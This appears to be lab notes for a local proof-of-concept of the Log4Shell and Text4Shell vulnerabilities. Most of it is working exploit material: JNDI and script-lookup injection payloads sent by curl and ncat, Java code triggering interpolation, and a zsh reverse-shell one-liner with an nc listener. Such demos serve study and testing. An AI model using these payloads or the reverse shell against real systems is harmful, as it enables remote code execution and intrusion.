# log4j - CVE-2021-44228

[medium link](https://medium.com/geekculture/log4j-vulnerability-in-detail-and-the-bigger-picture-db49f749009)  
[explanation 1](https://www.whitesourcesoftware.com/resources/blog/log4j-vulnerability-cve-2021-44228/)  
[explanation 2](https://github.com/EpicCoffee/log4j-vulnerability)  
[checkpoint](https://blog.checkpoint.com/2021/12/14/a-deep-dive-into-a-real-life-log4j-exploitation/)  

## commands  
`GET / HTTP/1.1 localhost:8080 Header-Attribute: ${jndi:ldap://localhost:8080/Basic/Command/Base64/Y2FsYw==}`  
`echo "GET http://localhost:8080/Basic/Command/Base64/Y2FsYw==" | ncat.exe localhost 8080`  
`echo "GET / HTTP/1.1 localhost:8080 Header-Attribute: ${jndi:ldap://localhost:8080/Basic/Command/Base64/Y2FsYw==}" | ncat.exe localhost 8080`  
`echo "GET localhost:8080 Header-Attribute:`${jndi:ldap://localhost:8080/Basic/Command/Base64/Y2FsYw==}" | ncat.exe localhost 8080`  
`curl.exe --header "Header-Attribute:'${jndi:ldap://localhost:8080/Basic/Command/Base64/Y2FsYw==}" http://localhost:8080`  
## payload examples
```
// 127.0.0.1:10389
// ${jndi:ldap://localhost:88/a}
// ${jndi:ldap://127.0.0.1:10389/o=reference}
// ${jndi:ldap://localhost:8080/Basic/Command/Base64/cG93ZXJzaGVsbCBjYWxj}
// ${jndi:ldap://localhost:8080/Basic/Command/Base64/Y2FsYw==}
// ${jndi:ldap://localhost:8080/cG93ZXJzaGVsbCBjYWxj}
```

# text4Shell - CVE-2022-42889

[Online Base64 encoder](https://www.base64encode.org)  

## commands
`curl.exe --header "Header-Attribute:'%24%7Bscript%3Ajavascript%3Ajava.lang.Runtime.getRuntime%28%29.exec%28%27calc%27%29%7" http://localhost:8080`  
`curl.exe --header "Header-Attribute:'${script:javascript:java.lang.Runtime.getRuntime().exec('calc')}'"`  
`http://localhost:8080/text4Shell/%24%7Bscript%3Ajavascript%3Ajava.lang.Runtime.getRuntime%28%29.exec%28%22calc%22%29%7D`  
`http://localhost:8080/text4Shell2?payload=%24%7Bscript%3Ajavascript%3Ajava.lang.Runtime.getRuntime%28%29.exec%28%22calc%22%29%7D`  
`http://localhost:8080/text4Shell/%24%7Bscript%3Ajavascript%3Ajava.lang.Runtime.getRuntime%28%29.exec%28%27calc%27%29%7D`  
`http://localhost:8080/text4Shell/%24%7Bscript%3Ajavascript%3Ajava.lang.Runtime.get.Runtime%28%29.exec%28%5C%27%27%2E%74%72%69%6D%28%24%63%6D%64%29%2E%27%5C%27%29%7D`  
`certutil.exe -encode .\payload.txt .\payload.enc`  

`http://localhost:8080/text4Shell2/%24%7Bscript%3Ajavascript%3Ajava.lang.Runtime.getRuntime().exec('touch%20test')%7D`  
`$%7Bscript:javascript:java.lang.Runtime.getRuntime().exec(%27ping%20-c%205%20172.17.0.1%27)%7D`  
++
`http://localhost:8080/text4Shell2/$%7Bscript:javascript:java.lang.Runtime.getRuntime().exec(%27ping%20-c%205%20192.168.178.1%27)%7D`  
`http://localhost:8080/text4Shell2/$%7Bscript:javascript:java.lang.Runtime.getRuntime().exec('touch%20test')%7D`

## codes
```
		StringSubstitutor stringSubstitutor0 = StringSubstitutor.createInterpolator();
		stringSubstitutor0.replace("${script:javascript:java.lang.Runtime.getRuntime().exec('touch ttt')}");

// 		not worked now
		String planC = StringLookupFactory.INSTANCE.scriptStringLookup()
				.lookup("${script:javascript:java.lang.Runtime.getRuntime().exec('ls')}");

		StringSubstitutor stringSubstitutor = StringSubstitutor.createInterpolator();
		stringSubstitutor.replace("${script:javascript:1 + 1}");

		StringSubstitutor stringSubstitutor2 = StringSubstitutor.createInterpolator();
		stringSubstitutor2.replace("${dns:address|localhost:8080}");

```

# reverse shells

[reverse shell generator](https://www.revshells.com)  

## shell
`zsh -c 'zmodload zsh/net/tcp && ztcp 192.168.178.37 9001 && zsh >&$REPLY 2>&$REPLY 0>&$REPLY'`  
## listener
`nc -lvn 9001`  

# RUN
Important: use original java 11 version  
`~/java_env/maven/bin/mvn clean package`  
`~/java_env/jdk-21.jdk/Contents/Home/bin/java -jar target/tech.cybersword.poc.log4j.text4shell-0.0.1-SNAPSHOT.jar` 